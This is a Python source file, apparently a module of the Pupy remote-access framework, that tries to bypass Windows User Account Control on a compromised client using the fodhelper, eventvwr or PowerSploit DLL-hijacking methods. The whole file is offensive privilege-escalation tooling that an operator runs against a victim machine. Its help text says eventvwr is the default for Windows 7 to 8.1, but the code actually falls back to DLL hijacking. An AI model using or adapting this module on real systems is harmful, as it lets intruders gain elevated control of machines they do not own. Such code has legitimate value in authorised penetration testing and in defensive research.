# -*- coding: utf-8 -*-
#Author: @bobsecq
#Contributor(s):

import os
from pupylib.PupyModule import *
from rpyc.utils.classic import upload
from modules.lib.windows.bypassuac import bypassuac
__class_name__="BypassUAC"

ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))

@config(compat="windows", category="privesc")
class BypassUAC(PupyModule):
    """try to bypass UAC """
    dependencies=['pupwinutils.processes', 'pupwinutils.security', 'powershell']

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="bypassuac", description=self.__doc__)
        self.arg_parser.add_argument('-m', dest='method', choices=["fodhelper","eventvwr", "dll_hijacking"], default=None, help="By default, the method will be choosen for you: 'eventvwr' for wind7-8.1 and 'fodhelper' for wind10. 'fodhelper' can be used on Wind10 only. 'dll_hijacking' method is deprecated (Windows 7/2008 and Windows 8/2012)")

    def run(self, args):
        # check if a UAC Bypass can be done
        if not self.client.conn.modules["pupwinutils.security"].can_get_admin_access():
            self.error('Your are not on the local administrator group.')
            return

        fodhelperMethod = False
        eventvwrMethod = False
        dllhijackingMethod = False

        bypassUasModule = bypassuac(self, rootPupyPath=ROOT)
        # choose methods depending on the OS Version
        if not args.method:
            if self.client.desc['release'] == '10':
                fodhelperMethod = True
            else:
                dllhijackingMethod = True
        elif args.method == "fodhelper":
            fodhelperMethod = True
        elif args.method == "eventvwr":
            eventvwrMethod = True
        elif args.method == "dll_hijacking":
            dllhijackingMethod = True

        if fodhelperMethod:
            self.success("Trying to bypass UAC using the 'fodhelper' method, wind10 targets ONLY...")
            bypassUasModule.bypassuac_through_fodhelper()
        if eventvwrMethod:
            #It is still working on Wind7 (tested 2017/09/14)
            self.warning("DEPRECATED method for wind10. Tested 2017/09/14")
            self.warning("Detected by Windows Defender on Wind10 (tested 2017/09/14)")
            self.success("Trying to bypass UAC using the Eventvwr method, wind7-8.1 targets...")
            bypassUasModule.bypassuac_through_eventVwrBypass()
        if dllhijackingMethod:
            #Invoke-BypassUAC.ps1 uses different technics to bypass depending on the Windows Version (Sysprep for Windows 7/2008 and NTWDBLIB.dll for Windows 8/2012)
            self.warning("DEPRECATED method. i.e. It doesn't work anymore on Wind7 (tested 2017/09/14)")
            self.success("Trying to bypass UAC using DLL Hijacking, wind7-8.1 targets...")
            bypassUasModule.bypassuac_through_powerSploitBypassUAC()
